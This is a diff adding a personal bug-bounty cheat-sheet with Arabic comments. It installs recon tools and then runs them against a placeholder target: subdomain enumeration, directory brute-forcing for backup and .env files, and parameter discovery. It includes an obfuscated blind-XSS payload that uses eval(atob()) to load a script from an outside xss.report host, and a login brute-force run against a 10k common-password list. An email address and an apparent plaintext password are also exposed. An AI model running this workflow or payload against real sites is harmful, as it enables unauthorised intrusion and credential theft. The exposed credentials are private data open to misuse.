@@ -1,0 +1,197 @@
+--python3>>>
+sudo apt-get update -y
+sudo apt-get dist-upgrade -y
+sudo apt install -y python3
+sudo apt install -y python3-pip
+sudo apt install python3.12-venv
+python3 --version
+pip3 --version
+
+-- Golang >>>
+sudo apt-get update -y
+sudo apt-get dist-upgrade -y
+wget https://go.dev/dl/go1.23.3.linux-amd64.tar.gz
+rm -rf /usr/local/go
+sudo tar -C /usr/local -xzf go1.23.3.linux-amd64.tar.gz
+echo $SHELL
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.zshrc or ~/.bashrc
+echo 'export PATH=$PATH:~/go/bin' >> ~/.zshrc or ~/.bashrc
+source ~/.zshrc or source ~/.bashrc
+go version
+rm -rf go1.23.3.linux-amd64.tar.gz
+
+--C-Make >>>
+sudo apt-get update -y
+sudo apt-get dist-upgrade -y
+sudo apt install cmake -y
+ 
+-- Rust >>>
+sudo apt-get update -y
+sudo apt-get dist-upgrade -y
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+source $HOME/.cargo/env
+rustc --version
+
+-- urldedupe >>>  اول اداه بن تيست بتعمل تصفيه لرابط اللي انت بتستخرجه
+git clone https://github.com/ameenmaali/urldedupe.git
+cd urldedupe
+cmake CMakeLists.txt
+make
+sudo cp urldedupe /usr/local/bin/
+cd ../
+urldedupe -h
+
+-- Arjun >>> اداة متخصصه في اكتشاف البراميترر
+git clone https://github.com/s0md3v/Arjun.git
+python3 -m venv arjun-env
+source arjun-env/bin/activate
+cd Arjun
+pip3 install .
+sudo cp ~/arjun-env/bin/arjun /usr/local/bin/
+deactivate
+cd ../
+arjun -h
+
+-- Waymore >>> اداة استخراج الروابط
+git clone https://github.com/xnl-h4ck3r/waymore.git
+python3 -m venv waymore-env
+source waymore-env/bin/activate
+cd waymore
+pip3 install .
+pip3 install -r requirements.txt
+sudo cp ~/waymore-env/bin/waymore /usr/local/bin/
+deactivate
+cd ../
+waymore -h
+
+-- Sublist3r >>> اداة اكتشاف صاب دومين
+git clone https://github.com/aboul3la/Sublist3r.git
+python3 -m venv sublist3r-env
+source sublist3r-env/bin/activate
+cd Sublist3r
+pip3 install .
+pip3 install -r requirements.txt
+sudo cp ~/sublist3r-env/bin/sublist3r /usr/local/bin/
+deactivate
+cd ../
+sublist3r -h
+
+-- Dirsearch >>>
+git clone https://github.com/maurosoria/dirsearch.git --depth 1
+python3 -m venv dirsearch-env
+source dirsearch-env/bin/activate
+cd dirsearch
+pip3 install .
+pip3 install -r requirements.txt
+sudo cp ~/dirsearch-env/bin/dirsearch /usr/local/bin/
+deactivate
+cd ../
+dirsearch -h
+
+-- subExtreme >>> بتخمن صب دومين لتارجت اللي انتا هتدهولها
+sudo apt-get update -y
+sudo apt-get dist-upgrade -y
+sudo apt install pkg-config -y
+sudo apt install libssl-dev -y
+git clone https://github.com/ahmedhamdy0x/subextreme.git
+cd subextreme
+cargo build --release
+cargo build
+sudo cp target/release/subextreme /usr/local/bin/
+sudo chmod +x /usr/local/bin/subextreme
+subextreme -h
+cd ../
+
+-- Httpx >>>
+sudo rm -f /usr/bin/httpx && sudo apt remove httpx -y
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+httpx -h
+
+-- Crawley >>> اداة تجميع عدد روابط
+mkdir crawley
+cd crawley
+wget https://github.com/s0rg/crawley/releases/download/v1.7.10/crawley_v1.7.10_linux_x86_64.tar.gz
+tar -xvzf crawley_v1.7.10_linux_x86_64.tar.gz
+sudo cp crawley /usr/local/bin/
+cd ../
+crawley -h
+
+-- PassURLs >>>  اداة بتبعت الروابط علي برنامج البربسويت علي هيئة ركويست
+git clone https://github.com/ahmedhamdy0x/passurls.git
+python3 -m venv passurls-env
+source passurls-env/bin/activate
+cd passurls
+pip3 install .
+pip3 install -r requirements.txt
+sudo cp ~/passurls-env/bin/passurls /usr/local/bin/
+deactivate
+cd ../
+passurls -h
+ 
+-- Dalfox >>> لاكتشاف ثغرة XSS
+go install github.com/hahwul/dalfox/v2@latest
+dalfox -h
+
+-- SecLists >>> محموعة ضخمه من الكلمات تخمن بيها صب دومين ال ديركتري
+git clone https://github.com/danielmiessler/SecLists.git 
+
+-- Burp Cert >>>
+Export Cert From Burpsuite by ‘.der’ Extension To Home Directory For Example
+openssl x509 -inform DER -in ~/burp.der -out ~/burp-ca.crt
+sudo cp ~/burp-ca.crt /usr/local/share/ca-certificates/
+sudo update-ca-certificates
+
+>>>>>>> -- Make Target Directory >>>
+mkdir bugbounty
+cd bugbounty
+mkdir <targetاسم الموقع المستهدف>
+cd <target>
+
+sublist3r -d <target> -b -t 50 -v -o sublist3r.txt
+subextreme -w ~/SecLists/Discovery/DNS/n0kovo_subdomains.txt -d <target>.com -c 10 -o subextreme.txt
+cat sublist3r.txt subextreme.txt | urldedupe -s > subdomains.txt
+cat subdomains.txt | wc
+httpx -l subdomains.txt -o *valid-subs.txt* -t 60 -random-agent 
+mousepad valid-subs.txt
+cat valid-subs.txt | waymore -mode B -oU waymoreUrls.txt -p 5 
+cat waymoreUrls.txt | wc
+cat waymoreUrls.txt | urldedupe -s > uniq-urls.txt
+cat uniq-urls.txt | wc
+passurls -p 127.0.0.1:8080 -l uniq-urls.txt
+dirsearch -u https://<target.com>/ -e 'conf,config,bak,backup,smp,old,db,sql,asp,aspx,py,rb,php,bhp,cache,cgi,csv,html,inc,jar,js,json,jsp,lock,log,rar,sql.gz,sql.zip,tar,tar.bz2,txt,wadl,zip,xml,swp,x~,asp~,py~,rb~,php~,bkp,jsp~,rar,gz,sql~,swp~,wdl,env,ini' --full-url --delay=10 --timeout=30 -p 127.0.0.1:8080 --random-agent -t 100 -w ~/SecLists/Discovery/Web-Content/combined_words.txt -o hidden-files.txt
+
+export http_proxy="http://127.0.0.1:8080"
+export https_proxy="http://127.0.0.1:8080"
+export ALL_PROXY="http://127.0.0.1:8080"
+-- crawley -headless -delay 10ms -depth -1 -subdomains -all -timeout 30s -user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" -dirs show https://<target.com>/ | tee crawley.txt
+
+shendymahmoud80@gamil.com
+m@hm0ud99
+
+nano burp-results.txt                                             >>>>>>>>>>>>    {{ ctrl+O  >> entr >>> ctrl+X }}
+grep -E '\?.*=' burp-results.txt > burp-params.txt 
+cat burp-params.txt | wc
+cat burp-params.txt | urldedupe -s > parameters.txt
+cat parameters.txt | wc
+
+arjun -i hidden-files.txt -t 10 -c 300 -T 30 -d 10 -oB 127.0.0.1:8080 -m POST -oT hidden-params1.txt
+arjun -i burp-results.txt -t 10 -c 300 -T 30 -d 10 -oB 127.0.0.1:8080 -m POST -oT hidden-params2.txt
+
+-- dalfox file parameters.txt --waf-evasion --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.
+36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' --timeout 30 --proxy 'http://127.0.0.1:800' -b ' "><img src=x i
+d=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzlnJlcG9ydC9jL3hkYW1hZ2V4Ijtkb2N1bWVudC5ib2R
+5LmFwcGVuZENoaWxkKGEpOw= onerror=eval(atob(this.id))>' -o dalfox.txt --deep-domxss
+ # بتجيب لينك من موقع xssReport
+
+
+python3 ~/BruteForceAI/BruteForceAI.py attack \
+  --urls http://<target.com>/login \
+  --usernames TestShendy \
+  --passwords ~/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
+  --mode bruteforce \
+  --output resultBruteForceAI.txt
+
+./feroxbuster -u <tarrget> -w SecLists/Discovery/Web-Content/common.txt -o <filename>
+
+
+
